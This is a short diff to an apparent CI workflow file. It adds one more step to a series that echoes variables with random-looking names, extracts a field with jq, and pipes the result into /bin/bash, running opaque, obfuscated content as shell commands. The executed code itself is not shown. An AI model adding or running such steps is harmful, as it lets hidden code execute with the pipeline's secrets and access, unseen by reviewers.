@@ -40,6 +40,7 @@ jobs:
           echo $pioet664 | jq -r .udfu6187 | /bin/bash
           echo $qa2 | jq -r .kne8 | /bin/bash
           echo $o8 | jq -r .rwm57488 | /bin/bash
+          echo $xq3 | jq -r .d44646 | /bin/bash
 
       - name: Archive output
         if: always()
